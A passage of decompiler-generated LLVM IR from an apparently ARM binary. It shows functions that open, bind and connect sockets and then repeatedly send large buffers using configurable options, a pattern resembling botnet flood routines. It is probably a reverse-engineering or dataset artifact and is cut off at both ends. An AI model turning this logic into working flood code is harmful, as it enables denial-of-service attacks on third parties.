dec_label_pc_9930.lr.ph:                          ; preds = %dec_label_pc_9964.preheader, %dec_label_pc_9964.loopexit
  br label %dec_label_pc_9930

dec_label_pc_9968.loopexit:                       ; preds = %dec_label_pc_9980
  %tmp44 = icmp slt i32 %v0_99a8, 1
  br i1 %tmp44, label %dec_label_pc_992c, label %dec_label_pc_9930

dec_label_pc_9970:                                ; preds = %dec_label_pc_980c
  store i32 %v3_96d4, i32* %r4.global-to-local, align 4
  store i32 %v6_96d4, i32* %r5.global-to-local, align 4
  store i32 %v24_96d4, i32* %fp.global-to-local, align 4
  ret i32 -1

dec_label_pc_9978:                                ; preds = %dec_label_pc_9930
  store i32 0, i32* @fp, align 4
  br label %dec_label_pc_9980

dec_label_pc_9980:                                ; preds = %dec_label_pc_9980, %dec_label_pc_9978
  %v0_9980 = phi i32 [ %v1_99ac, %dec_label_pc_9980 ], [ 0, %dec_label_pc_9978 ]
  %v1_9980 = load i32, i32* @sl, align 4
  %v2_9980 = add i32 %v1_9980, %v0_9980
  %v3_9980 = inttoptr i32 %v2_9980 to i32*
  %v4_9980 = load i32, i32* %v3_9980, align 4
  store i32 %v4_9980, i32* @r4, align 4
  %v0_9984 = load i32, i32* @r6, align 4
  store i32 %v0_9984, i32* @r1, align 4
  %v1_998c = inttoptr i32 %v4_9980 to i8*
  %v2_998c = call i32 @function_f7fc(i8* %v1_998c)
  %v0_9990 = load i32, i32* @r5, align 4
  %v1_9990 = add i32 %v0_9990, 1
  store i32 %v1_9990, i32* @r5, align 4
  %v0_9994 = load i32, i32* @fp, align 4
  %v1_9994 = load i32, i32* @sb, align 4
  %v2_9994 = add i32 %v1_9994, %v0_9994
  %v3_9994 = inttoptr i32 %v2_9994 to i32*
  %v4_9994 = load i32, i32* %v3_9994, align 4
  %v0_9998 = load i32, i32* @r4, align 4
  store i32 %v0_9998, i32* %r1.global-to-local, align 4
  %v0_999c = load i32, i32* @r6, align 4
  %v4_99a4 = inttoptr i32 %v0_9998 to i32*
  %v5_99a4 = call i32 @send(i32 %v4_9994, i32* %v4_99a4, i32 %v0_999c, i32 16384)
  %v0_99a8 = load i32, i32* @r5, align 4
  %v1_99a8 = load i32, i32* @r7, align 4
  %v9_99a8 = icmp eq i32 %v0_99a8, %v1_99a8
  %v0_99ac = load i32, i32* @fp, align 4
  %v1_99ac = add i32 %v0_99ac, 4
  store i32 %v1_99ac, i32* @fp, align 4
  br i1 %v9_99a8, label %dec_label_pc_9968.loopexit, label %dec_label_pc_9980

; uselistorder directives
  uselistorder i32 %v1_99ac, { 1, 0 }
  uselistorder i32 %v0_99a8, { 1, 0 }
  uselistorder i32 %v1_995c, { 1, 0 }
  uselistorder i32 %v1_9948, { 2, 0, 3, 1 }
  uselistorder i32 %stack_var_-60.0, { 0, 2, 4, 1, 3 }
  uselistorder i32 %v8_989c, { 1, 2, 0 }
  uselistorder i32 %v3_9874, { 1, 2, 0, 3 }
  uselistorder i32 %v3_9824, { 1, 2, 0 }
  uselistorder i32 %v1_9814, { 1, 2, 0 }
  uselistorder i32 %v3_977c, { 0, 2, 1 }
  uselistorder i32 %v1_96d8, { 1, 0 }
  uselistorder i8* %stack_var_-80, { 1, 0 }
  uselistorder i32* %stack_var_-52, { 1, 0, 3, 2 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 4, 5, 2, 6, 3, 7, 8, 9, 10, 11 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 17, 18, 3, 4, 5, 6, 13, 14, 15, 16, 19, 7, 9, 8, 10, 12, 11, 0 }
  uselistorder i32* %fp.global-to-local, { 0, 3, 1, 2 }
  uselistorder label %dec_label_pc_9930.lr.ph, { 1, 0 }
  uselistorder label %dec_label_pc_9930, { 1, 0 }
  uselistorder label %dec_label_pc_992c, { 3, 0, 4, 2, 1 }
  uselistorder label %dec_label_pc_98c0, { 1, 0 }
  uselistorder label %dec_label_pc_97b8, { 1, 0 }
}

define i32 @function_99bc(i32 %arg1, %sockaddr* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_99bc:
  %fp.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %tmp = ptrtoint %sockaddr* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-80 = alloca i8, align 1
  %v3_99bc = load i32, i32* @r4, align 4
  %v6_99bc = load i32, i32* @r5, align 4
  %v24_99bc = load i32, i32* @fp, align 4
  %v1_99c0 = urem i32 %arg1, 256
  store i32 %v1_99c0, i32* @r7, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg4, i32* @r6, align 4
  %v1_99d8 = urem i32 %arg3, 256
  store i32 %v1_99d8, i32* @r4, align 4
  %v2_99dc = call i32* @calloc(i32 %v1_99c0, i32 4)
  %v4_99dc = ptrtoint i32* %v2_99dc to i32
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %v4_99dc, i32* @sl, align 4
  %v0_99e8 = load i32, i32* @r7, align 4
  %v2_99ec = call i32* @calloc(i32 %v0_99e8, i32 4)
  %v3_99ec = ptrtoint i32* %v2_99ec to i32
  store i32 add (i32 ptrtoint (i32* @global_var_10000.102 to i32), i32 -1), i32* @r5, align 4
  %v0_99f8 = load i32, i32* @r6, align 4
  store i32 %v0_99f8, i32* %r1.global-to-local, align 4
  store i32 %v3_99ec, i32* @sb, align 4
  %v0_9a08 = load i32, i32* @r4, align 4
  %v4_9a0c = inttoptr i32 %v0_99f8 to i32*
  %v5_9a0c = call i32 @function_92dc(i32 %v0_9a08, i32* %v4_9a0c, i32 7, i32 add (i32 ptrtoint (i32* @global_var_10000.102 to i32), i32 -1))
  %v3_9a14 = urem i32 %v5_9a0c, 65536
  %v0_9a18 = load i32, i32* @r6, align 4
  store i32 %v0_9a18, i32* %r1.global-to-local, align 4
  %v0_9a20 = load i32, i32* @r5, align 4
  %v0_9a24 = load i32, i32* @r4, align 4
  %v5_9a2c = inttoptr i32 %v0_9a18 to i32*
  %v6_9a2c = call i32 @function_92dc(i32 %v0_9a24, i32* %v5_9a2c, i32 6, i32 %v0_9a20)
  %v0_9a30 = load i32, i32* @r6, align 4
  store i32 %v0_9a30, i32* %r1.global-to-local, align 4
  %v3_9a34 = mul i32 %v6_9a2c, 65536
  store i32 %v3_9a34, i32* %fp.global-to-local, align 4
  %v0_9a40 = load i32, i32* @r4, align 4
  %v4_9a44 = inttoptr i32 %v0_9a30 to i32*
  %v5_9a44 = call i32 @function_92dc(i32 %v0_9a40, i32* %v4_9a44, i32 0, i32 1024)
  %v0_9a50 = load i32, i32* @r6, align 4
  store i32 %v0_9a50, i32* %r1.global-to-local, align 4
  %v0_9a54 = load i32, i32* @r4, align 4
  %v3_9a5c = urem i32 %v5_9a44, 65536
  store i32 %v3_9a5c, i32* @r6, align 4
  %v4_9a60 = inttoptr i32 %v0_9a50 to i32*
  %v5_9a60 = call i32 @function_92dc(i32 %v0_9a54, i32* %v4_9a60, i32 1, i32 1)
  %v0_9a64 = load i32, i32* %fp.global-to-local, align 4
  %v3_9a64 = udiv i32 %v0_9a64, 65536
  store i32 %v3_9a64, i32* %r4.global-to-local, align 4
  %v1_9a6c = load i32, i32* @r5, align 4
  %v9_9a6c = icmp eq i32 %v3_9a64, %v1_9a6c
  store i32 0, i32* %stack_var_-52, align 4
  br i1 %v9_9a6c, label %dec_label_pc_9a94, label %bb

bb:                                               ; preds = %dec_label_pc_99bc
  %v2_9a80 = mul nuw nsw i32 %v3_9a64, 256
  %v4_9a84 = and i32 %v2_9a80, 65280
  %v1_9a88 = urem i32 %v5_9a60, 256
  store i32 %v1_9a88, i32* @r8, align 4
  %v5_9a8c = udiv i32 %v0_9a64, 16777216
  %v6_9a8c = or i32 %v4_9a84, %v5_9a8c
  br label %dec_label_pc_9aa0

dec_label_pc_9a94:                                ; preds = %dec_label_pc_99bc
  %v1_9a888 = urem i32 %v5_9a60, 256
  store i32 %v1_9a888, i32* @r8, align 4
  %v0_9a94 = call i32 @function_f67c()
  %v3_9a9c = urem i32 %v0_9a94, 65536
  br label %dec_label_pc_9aa0

dec_label_pc_9aa0:                                ; preds = %bb, %dec_label_pc_9a94
  %storemerge18 = phi i32 [ %v6_9a8c, %bb ], [ %v3_9a9c, %dec_label_pc_9a94 ]
  store i32 %storemerge18, i32* %fp.global-to-local, align 4
  %v0_9aa0 = load i32, i32* @r7, align 4
  %tmp43 = icmp slt i32 %v0_9aa0, 1
  br i1 %tmp43, label %dec_label_pc_9c4c.preheader.thread, label %dec_label_pc_9aa8

dec_label_pc_9c4c.preheader.thread:               ; preds = %dec_label_pc_9aa0
  br label %dec_label_pc_9c14

dec_label_pc_9c4c.preheader:                      ; preds = %dec_label_pc_9ba8
  %tmp454850 = icmp slt i32 %v1_9afc, 1
  br i1 %tmp454850, label %dec_label_pc_9c14, label %dec_label_pc_9c18.lr.ph

dec_label_pc_9aa8:                                ; preds = %dec_label_pc_9aa0
  store i32 %v3_9a14, i32* %r1.global-to-local, align 4
  %v3_9aac = udiv i32 %v5_9a0c, 256
  %v5_9ab8 = trunc i32 %v3_9aac to i8
  store i32 %tmp, i32* %r5.global-to-local, align 4
  %v3_9ad0 = udiv i32 %v5_9a0c, 65536
  %v4_9ae0 = trunc i32 %v3_9ad0 to i8
  store i8 %v4_9ae0, i8* %stack_var_-80, align 1
  %v9_9bf4 = icmp eq i32 %v3_9a14, add (i32 ptrtoint (i32* @global_var_10000.102 to i32), i32 -1)
  %v2_9b18 = ptrtoint i32* %stack_var_-52 to i32
  %tmp44 = bitcast i32* %stack_var_-52 to %sockaddr*
  br label %dec_label_pc_9bd8

dec_label_pc_9ae8:                                ; preds = %dec_label_pc_9bd8
  %v2_9ae8 = load i8, i8* %stack_var_-80, align 1
  %v3_9ae8 = sext i8 %v2_9ae8 to i32
  store i32 %v3_9ae8, i32* %r1.global-to-local, align 4
  %v2_9aec = load i32, i32* %r5.global-to-local, align 4
  %v3_9aec = add i32 %v2_9aec, 2
  %v4_9aec = inttoptr i32 %v3_9aec to i8*
  store i8 %v5_9ab8, i8* %v4_9aec, align 1
  %v0_9af0 = load i32, i32* %r1.global-to-local, align 4
  %v1_9af0 = trunc i32 %v0_9af0 to i8
  %v2_9af0 = load i32, i32* %r5.global-to-local, align 4
  %v3_9af0 = add i32 %v2_9af0, 3
  %v4_9af0 = inttoptr i32 %v3_9af0 to i8*
  store i8 %v1_9af0, i8* %v4_9af0, align 1
  br label %dec_label_pc_9af4

dec_label_pc_9af4:                                ; preds = %dec_label_pc_9c00, %dec_label_pc_9ae8
  %v1_9afc = add i32 %stack_var_-56.0, 1
  store i32 2, i32* %r1.global-to-local, align 4
  %v3_9b0c = call i32 @socket(i32 2, i32 0, i32 0)
  %v7_9b14 = icmp eq i32 %v3_9b0c, -1
  store i32 %v2_9b18, i32* %r1.global-to-local, align 4
  %v2_9b24 = load i32, i32* @sb, align 4
  %v3_9b24 = add i32 %v2_9b24, %stack_var_-60.0
  %v4_9b24 = inttoptr i32 %v3_9b24 to i32*
  store i32 %v3_9b0c, i32* %v4_9b24, align 4
  br i1 %v7_9b14, label %dec_label_pc_9c58, label %dec_label_pc_9b2c

dec_label_pc_9b2c:                                ; preds = %dec_label_pc_9af4
  store i32 2, i32* %stack_var_-52, align 4
  %v5_9b4c = call i32 @bind(i32 %v3_9b0c, %sockaddr* %tmp44, i32 16)
  %v0_9b50 = load i32, i32* %r5.global-to-local, align 4
  %v1_9b50 = add i32 %v0_9b50, 20
  %v2_9b50 = inttoptr i32 %v1_9b50 to i8*
  %v3_9b50 = load i8, i8* %v2_9b50, align 1
  %tmp54 = icmp ugt i8 %v3_9b50, 31
  br i1 %tmp54, label %dec_label_pc_9ba8, label %dec_label_pc_9b5c

dec_label_pc_9b5c:                                ; preds = %dec_label_pc_9b2c
  %v1_9b5c = add i32 %v0_9b50, 16
  %v2_9b5c = inttoptr i32 %v1_9b5c to i32*
  %v3_9b5c = load i32, i32* %v2_9b5c, align 4
  store i32 %v3_9b5c, i32* %r4.global-to-local, align 4
  %v0_9b60 = call i32 @function_f67c()
  %v1_9b68 = and i32 %v3_9b5c, 65280
  %v3_9b70 = mul i32 %v3_9b5c, 16777216
  %v4_9b74 = mul nuw nsw i32 %v1_9b68, 256
  %v5_9b74 = or i32 %v4_9b74, %v3_9b70
  store i32 %v5_9b74, i32* %r1.global-to-local, align 4
  %v0_9b7c = load i32, i32* %r5.global-to-local, align 4
  %v1_9b7c = add i32 %v0_9b7c, 20
  %v2_9b7c = inttoptr i32 %v1_9b7c to i8*
  %v3_9b7c = load i8, i8* %v2_9b7c, align 1
  %v4_9b7c = zext i8 %v3_9b7c to i32
  %v2_9b80 = call i32 @llvm.bswap.i32(i32 %v3_9b5c)
  %v7_9b84 = lshr i32 %v0_9b60, %v4_9b7c
  %v8_9b84 = add i32 %v7_9b84, %v2_9b80
  %v3_9b90 = mul i32 %v8_9b84, 16777216
  %v1_9b94 = and i32 %v8_9b84, 65280
  %v4_9b98 = mul nuw nsw i32 %v1_9b94, 256
  %v5_9b98 = or i32 %v4_9b98, %v3_9b90
  store i32 %v5_9b98, i32* %r1.global-to-local, align 4
  %v2_9ba0 = call i32 @llvm.bswap.i32(i32 %v8_9b84)
  %v2_9ba4 = add i32 %v0_9b7c, 4
  %v3_9ba4 = inttoptr i32 %v2_9ba4 to i32*
  store i32 %v2_9ba0, i32* %v3_9ba4, align 4
  %v0_9bb4.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_9ba8

dec_label_pc_9ba8:                                ; preds = %dec_label_pc_9b2c, %dec_label_pc_9b5c
  %v0_9bb4 = phi i32 [ %v0_9b50, %dec_label_pc_9b2c ], [ %v0_9bb4.pre, %dec_label_pc_9b5c ]
  store i32 %stack_var_-60.0, i32* %r1.global-to-local, align 4
  %v1_9bb0 = load i32, i32* @sb, align 4
  %v2_9bb0 = add i32 %v1_9bb0, %stack_var_-60.0
  %v3_9bb0 = inttoptr i32 %v2_9bb0 to i32*
  %v4_9bb0 = load i32, i32* %v3_9bb0, align 4
  %v1_9bb4 = inttoptr i32 %v0_9bb4 to %sockaddr*
  store i32 %v0_9bb4, i32* %r1.global-to-local, align 4
  %v5_9bb8 = call i32 @connect(i32 %v4_9bb0, %sockaddr* %v1_9bb4, i32 16)
  %v1_9bc4 = add i32 %stack_var_-60.0, 4
  %v1_9bc8 = load i32, i32* @r7, align 4
  %v9_9bc8 = icmp eq i32 %v1_9afc, %v1_9bc8
  %v0_9bd0 = load i32, i32* %r5.global-to-local, align 4
  %v1_9bd0 = add i32 %v0_9bd0, 24
  store i32 %v1_9bd0, i32* %r5.global-to-local, align 4
  br i1 %v9_9bc8, label %dec_label_pc_9c4c.preheader, label %dec_label_pc_9bd8

dec_label_pc_9bd8:                                ; preds = %dec_label_pc_9ba8, %dec_label_pc_9aa8
  %stack_var_-60.0 = phi i32 [ 0, %dec_label_pc_9aa8 ], [ %v1_9bc4, %dec_label_pc_9ba8 ]
  %stack_var_-56.0 = phi i32 [ 0, %dec_label_pc_9aa8 ], [ %v1_9afc, %dec_label_pc_9ba8 ]
  store i32 1, i32* %r1.global-to-local, align 4
  %v2_9be4 = call i32* @calloc(i32 add (i32 ptrtoint (i32* @global_var_10000.102 to i32), i32 -1), i32 1)
  %v3_9be4 = ptrtoint i32* %v2_9be4 to i32
  store i32 %v3_9a14, i32* %r1.global-to-local, align 4
  %v2_9bf8 = load i32, i32* @sl, align 4
  %v3_9bf8 = add i32 %v2_9bf8, %stack_var_-60.0
  %v4_9bf8 = inttoptr i32 %v3_9bf8 to i32*
  store i32 %v3_9be4, i32* %v4_9bf8, align 4
  br i1 %v9_9bf4, label %dec_label_pc_9c00, label %dec_label_pc_9ae8

dec_label_pc_9c00:                                ; preds = %dec_label_pc_9bd8
  %v0_9c00 = call i32 @function_f67c()
  %v1_9c00 = trunc i32 %v0_9c00 to i8
  %v4_9c04 = sdiv i32 %v0_9c00, 256
  %v1_9c08 = trunc i32 %v4_9c04 to i8
  %v2_9c08 = load i32, i32* %r5.global-to-local, align 4
  %v3_9c08 = add i32 %v2_9c08, 3
  %v4_9c08 = inttoptr i32 %v3_9c08 to i8*
  store i8 %v1_9c08, i8* %v4_9c08, align 1
  %v3_9c0c = load i32, i32* %r5.global-to-local, align 4
  %v4_9c0c = add i32 %v3_9c0c, 2
  %v5_9c0c = inttoptr i32 %v4_9c0c to i8*
  store i8 %v1_9c00, i8* %v5_9c0c, align 1
  br label %dec_label_pc_9af4

dec_label_pc_9c14:                                ; preds = %dec_label_pc_9c4c.loopexit, %dec_label_pc_9c4c.preheader.thread, %dec_label_pc_9c4c.preheader, %dec_label_pc_9c50.loopexit, %dec_label_pc_9c14
  br label %dec_label_pc_9c14

dec_label_pc_9c18:                                ; preds = %dec_label_pc_9c18.lr.ph, %dec_label_pc_9c50.loopexit
  %v0_9c18 = load i32, i32* @r8, align 4
  %v2_9c18 = icmp eq i32 %v0_9c18, 0
  store i32 0, i32* @r5, align 4
  br i1 %v2_9c18, label %dec_label_pc_9c20, label %dec_label_pc_9c60

dec_label_pc_9c20:                                ; preds = %dec_label_pc_9c18
  store i32 0, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_9c28

dec_label_pc_9c28:                                ; preds = %dec_label_pc_9c28, %dec_label_pc_9c20
  %v0_9c30 = phi i32 [ %v1_9c30, %dec_label_pc_9c28 ], [ 0, %dec_label_pc_9c20 ]
  %v0_9c28 = phi i32 [ %v1_9c44, %dec_label_pc_9c28 ], [ 0, %dec_label_pc_9c20 ]
  %v1_9c28 = load i32, i32* @sb, align 4
  %v2_9c28 = add i32 %v1_9c28, %v0_9c28
  %v3_9c28 = inttoptr i32 %v2_9c28 to i32*
  %v4_9c28 = load i32, i32* %v3_9c28, align 4
  %v1_9c2c = load i32, i32* @sl, align 4
  %v2_9c2c = add i32 %v1_9c2c, %v0_9c28
  %v3_9c2c = inttoptr i32 %v2_9c2c to i32*
  %v4_9c2c = load i32, i32* %v3_9c2c, align 4
  store i32 %v4_9c2c, i32* %r1.global-to-local, align 4
  %v1_9c30 = add i32 %v0_9c30, 1
  store i32 %v1_9c30, i32* %r5.global-to-local, align 4
  %v0_9c34 = load i32, i32* @r6, align 4
  %v4_9c3c = inttoptr i32 %v4_9c2c to i32*
  %v5_9c3c = call i32 @send(i32 %v4_9c28, i32* %v4_9c3c, i32 %v0_9c34, i32 16384)
  %v1_9c40 = load i32, i32* @r7, align 4
  %v9_9c40 = icmp eq i32 %v1_9c30, %v1_9c40
  %v0_9c44 = load i32, i32* %r4.global-to-local, align 4
  %v1_9c44 = add i32 %v0_9c44, 4
  store i32 %v1_9c44, i32* %r4.global-to-local, align 4
  br i1 %v9_9c40, label %dec_label_pc_9c4c.loopexit, label %dec_label_pc_9c28

dec_label_pc_9c4c.loopexit:                       ; preds = %dec_label_pc_9c28
  %tmp4548 = icmp slt i32 %v1_9c30, 1
  br i1 %tmp4548, label %dec_label_pc_9c14, label %dec_label_pc_9c18.lr.ph

dec_label_pc_9c18.lr.ph:                          ; preds = %dec_label_pc_9c4c.preheader, %dec_label_pc_9c4c.loopexit
  br label %dec_label_pc_9c18

dec_label_pc_9c50.loopexit:                       ; preds = %dec_label_pc_9c68
  %tmp45 = icmp slt i32 %v0_9c90, 1
  br i1 %tmp45, label %dec_label_pc_9c14, label %dec_label_pc_9c18

dec_label_pc_9c58:                                ; preds = %dec_label_pc_9af4
  store i32 %v3_99bc, i32* %r4.global-to-local, align 4
  store i32 %v6_99bc, i32* %r5.global-to-local, align 4
  store i32 %v24_99bc, i32* %fp.global-to-local, align 4
  ret i32 -1

dec_label_pc_9c60:                                ; preds = %dec_label_pc_9c18
  store i32 0, i32* @fp, align 4
  br label %dec_label_pc_9c68

dec_label_pc_9c68:                                ; preds = %dec_label_pc_9c68, %dec_label_pc_9c60
  %v0_9c68 = phi i32 [ %v1_9c94, %dec_label_pc_9c68 ], [ 0, %dec_label_pc_9c60 ]
  %v1_9c68 = load i32, i32* @sl, align 4
  %v2_9c68 = add i32 %v1_9c68, %v0_9c68
  %v3_9c68 = inttoptr i32 %v2_9c68 to i32*
  %v4_9c68 = load i32, i32* %v3_9c68, align 4
  store i32 %v4_9c68, i32* @r4, align 4
  %v0_9c6c = load i32, i32* @r6, align 4
  store i32 %v0_9c6c, i32* @r1, align 4
  %v1_9c74 = inttoptr i32 %v4_9c68 to i8*
  %v2_9c74 = call i32 @function_f7fc(i8* %v1_9c74)
  %v0_9c78 = load i32, i32* @r5, align 4
  %v1_9c78 = add i32 %v0_9c78, 1
  store i32 %v1_9c78, i32* @r5, align 4
  %v0_9c7c = load i32, i32* @fp, align 4
  %v1_9c7c = load i32, i32* @sb, align 4
  %v2_9c7c = add i32 %v1_9c7c, %v0_9c7c
  %v3_9c7c = inttoptr i32 %v2_9c7c to i32*
  %v4_9c7c = load i32, i32* %v3_9c7c, align 4
  %v0_9c80 = load i32, i32* @r4, align 4
  store i32 %v0_9c80, i32* %r1.global-to-local, align 4
  %v0_9c84 = load i32, i32* @r6, align 4
  %v4_9c8c = inttoptr i32 %v0_9c80 to i32*
  %v5_9c8c = call i32 @send(i32 %v4_9c7c, i32* %v4_9c8c, i32 %v0_9c84, i32 16384)
  %v0_9c90 = load i32, i32* @r5, align 4
  %v1_9c90 = load i32, i32* @r7, align 4
  %v9_9c90 = icmp eq i32 %v0_9c90, %v1_9c90
  %v0_9c94 = load i32, i32* @fp, align 4
  %v1_9c94 = add i32 %v0_9c94, 4
  store i32 %v1_9c94, i32* @fp, align 4
  br i1 %v9_9c90, label %dec_label_pc_9c50.loopexit, label %dec_label_pc_9c68

; uselistorder directives
  uselistorder i32 %v1_9c94, { 1, 0 }
  uselistorder i32 %v0_9c90, { 1, 0 }
  uselistorder i32 %v1_9c44, { 1, 0 }
  uselistorder i32 %v1_9c30, { 2, 0, 3, 1 }
  uselistorder i32 %stack_var_-60.0, { 0, 2, 4, 1, 3 }
  uselistorder i32 %v8_9b84, { 1, 2, 0 }
  uselistorder i32 %v3_9b5c, { 1, 2, 0, 3 }
  uselistorder i32 %v3_9b0c, { 2, 1, 0 }
  uselistorder i32 %v1_9afc, { 1, 2, 0 }
  uselistorder i32 %v3_9a64, { 0, 2, 1 }
  uselistorder i32 %v1_99c0, { 1, 0 }
  uselistorder i8* %stack_var_-80, { 1, 0 }
  uselistorder i32* %stack_var_-52, { 1, 0, 3, 2 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 4, 5, 2, 6, 3, 7, 8, 9, 10, 11 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 11, 12, 3, 4, 5, 6, 7, 8, 9, 10, 13, 14, 16, 15, 17, 19, 18, 0 }
  uselistorder label %dec_label_pc_9c18.lr.ph, { 1, 0 }
  uselistorder label %dec_label_pc_9c18, { 1, 0 }
  uselistorder label %dec_label_pc_9c14, { 3, 0, 4, 2, 1 }
  uselistorder label %dec_label_pc_9ba8, { 1, 0 }
  uselistorder label %dec_label_pc_9aa0, { 1, 0 }
}

define i32 @function_9ca4(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_9ca4:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-40 = alloca i32, align 4
  %v3_9ca4 = load i32, i32* @r4, align 4
  %v6_9ca4 = load i32, i32* @r5, align 4
  %v9_9ca4 = load i32, i32* @r6, align 4
  %v12_9ca4 = load i32, i32* @r7, align 4
  %v18_9ca4 = load i32, i32* @sb, align 4
  %v24_9ca4 = load i32, i32* @fp, align 4
  %v1_9ca8 = urem i32 %arg1, 256
  store i32 %v1_9ca8, i32* @sl, align 4
  store i32 %arg2, i32* @r8, align 4
  store i32 %v1_9ca8, i32* %r0.global-to-local, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg4, i32* @r5, align 4
  %v1_9cc0 = urem i32 %arg3, 256
  store i32 %v1_9cc0, i32* @r4, align 4
  %v2_9cc4 = call i32* @calloc(i32 %v1_9ca8, i32 4)
  %v4_9cc4 = ptrtoint i32* %v2_9cc4 to i32
  %v0_9cc8 = load i32, i32* @r5, align 4
  store i32 %v0_9cc8, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_9cd8 = load i32, i32* @r4, align 4
  store i32 %v0_9cd8, i32* %r0.global-to-local, align 4
  %v5_9cdc = inttoptr i32 %v0_9cc8 to i32*
  %v6_9cdc = call i32 @function_92dc(i32 %v0_9cd8, i32* %v5_9cdc, i32 2, i32 0)
  %v1_9ce8 = urem i32 %v6_9cdc, 256
  store i32 %v1_9ce8, i32* %ip.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_10000.102 to i32), i32 -1), i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_9cf4 = load i32, i32* @r5, align 4
  store i32 %v0_9cf4, i32* %r1.global-to-local, align 4
  %v0_9cf8 = load i32, i32* @r4, align 4
  store i32 %v0_9cf8, i32* %r0.global-to-local, align 4
  %v5_9cfc = trunc i32 %v6_9cdc to i8
  %v6_9d00 = inttoptr i32 %v0_9cf4 to i32*
  %v7_9d00 = call i32 @function_92dc(i32 %v0_9cf8, i32* %v6_9d00, i32 3, i32 add (i32 ptrtoint (i32* @global_var_10000.102 to i32), i32 -1))
  %v0_9d04 = load i32, i32* @r5, align 4
  store i32 %v0_9d04, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v7_9d00, i32* %fp.global-to-local, align 4
  %v0_9d14 = load i32, i32* @r4, align 4
  store i32 %v0_9d14, i32* %r0.global-to-local, align 4
  %v4_9d18 = inttoptr i32 %v0_9d04 to i32*
  %v5_9d18 = call i32 @function_92dc(i32 %v0_9d14, i32* %v4_9d18, i32 4, i32 64)
  %v1_9d20 = urem i32 %v5_9d18, 256
  store i32 %v1_9d20, i32* %ip.global-to-local, align 4
  %v0_9d24 = load i32, i32* @r5, align 4
  store i32 %v0_9d24, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_9d30 = load i32, i32* @r4, align 4
  store i32 %v0_9d30, i32* %r0.global-to-local, align 4
  %v5_9d34 = trunc i32 %v5_9d18 to i8
  %v6_9d38 = inttoptr i32 %v0_9d24 to i32*
  %v7_9d38 = call i32 @function_92dc(i32 %v0_9d30, i32* %v6_9d38, i32 5, i32 0)
  %v1_9d44 = urem i32 %v7_9d38, 256
  store i32 %v1_9d44, i32* %ip.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_10000.102 to i32), i32 -1), i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_9d50 = load i32, i32* @r5, align 4
  store i32 %v0_9d50, i32* %r1.global-to-local, align 4
  %v0_9d54 = load i32, i32* @r4, align 4
  store i32 %v0_9d54, i32* %r0.global-to-local, align 4
  %v5_9d5c = inttoptr i32 %v0_9d50 to i32*
  %v6_9d5c = call i32 @function_92dc(i32 %v0_9d54, i32* %v5_9d5c, i32 6, i32 add (i32 ptrtoint (i32* @global_var_10000.102 to i32), i32 -1))
  %v0_9d64 = load i32, i32* @r5, align 4
  store i32 %v0_9d64, i32* %r1.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_10000.102 to i32), i32 -1), i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 %v6_9d5c, i32* @r7, align 4
  %v0_9d74 = load i32, i32* @r4, align 4
  store i32 %v0_9d74, i32* %r0.global-to-local, align 4
  %v4_9d78 = inttoptr i32 %v0_9d64 to i32*
  %v5_9d78 = call i32 @function_92dc(i32 %v0_9d74, i32* %v4_9d78, i32 7, i32 add (i32 ptrtoint (i32* @global_var_10000.102 to i32), i32 -1))
  %v0_9d7c = load i32, i32* @r5, align 4
  store i32 %v0_9d7c, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 512, i32* %r3.global-to-local, align 4
  store i32 %v5_9d78, i32* %sb.global-to-local, align 4
  %v0_9d8c = load i32, i32* @r4, align 4
  store i32 %v0_9d8c, i32* %r0.global-to-local, align 4
  %v4_9d90 = inttoptr i32 %v0_9d7c to i32*
  %v5_9d90 = call i32 @function_92dc(i32 %v0_9d8c, i32* %v4_9d90, i32 0, i32 512)
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_9d9c = load i32, i32* @r5, align 4
  store i32 %v0_9d9c, i32* %r1.global-to-local, align 4
  store i32 %v5_9d90, i32* @r6, align 4
  %v0_9da4 = load i32, i32* @r4, align 4
  store i32 %v0_9da4, i32* %r0.global-to-local, align 4
